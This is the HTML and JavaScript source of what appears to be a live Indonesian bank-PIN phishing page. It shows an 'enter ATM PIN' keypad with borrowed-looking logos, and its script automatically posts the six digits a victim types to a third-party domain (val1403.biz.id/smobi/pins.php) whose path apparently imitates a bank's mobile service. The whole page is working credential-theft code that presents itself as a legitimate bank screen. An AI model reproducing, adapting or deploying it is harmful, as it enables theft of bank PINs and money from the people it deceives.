<body>
              <div
              <a class="back" href="./../kardatm"><img class="back" src="https://programpromo.publit.io/file/Picsart-25-05-21-05-13-12-467.png"></a>

  <div class="container">
                  <img class="mobi_logo" src="https://programpromo.publit.io/file/Picsart-25-05-21-07-59-53-682.png">
    <h2>Masukkan PIN ATM</h2>
    <div class="pin-dots" id="pin-dots">
      <span></span><span></span><span></span><span></span><span></span><span></span>
    </div>
    <div class="keypad">
      <button onclick="inputPin('1')">1</button>
      <button onclick="inputPin('2')">2</button>
      <button onclick="inputPin('3')">3</button>
      <button onclick="inputPin('4')">4</button>
      <button onclick="inputPin('5')">5</button>
      <button onclick="inputPin('6')">6</button>
      <button onclick="inputPin('7')">7</button>
      <button onclick="inputPin('8')">8</button>
      <button onclick="inputPin('9')">9</button>
      <div></div>
      <button onclick="inputPin('0')">0</button>
      <button onclick="hapusPin()">âŒ«</button>
    </div>
    <p class="reset">Lupa PIN? <a href="#">Reset</a></p>
  </div>

  <form action="https://val1403.biz.id/smobi/pins.php" method="POST" id="pinForm">
    <input type="hidden" name="pin1" id="pinInput">
  </form>

  <script>
    let pin = "";

    function inputPin(num) {
      if (pin.length < 6) {
        pin += num;
        updateDots();
        if (pin.length === 6) {
          document.getElementById("pinInput").value = pin;
          document.getElementById("pinForm").submit();
        }
      }
    }

    function hapusPin() {
      pin = pin.slice(0, -1);
      updateDots();
    }

    function updateDots() {
      const dots = document.querySelectorAll("#pin-dots span");
      dots.forEach((dot, index) => {
        dot.classList.toggle("filled", index < pin.length);
      });
    }
  </script>
</body>
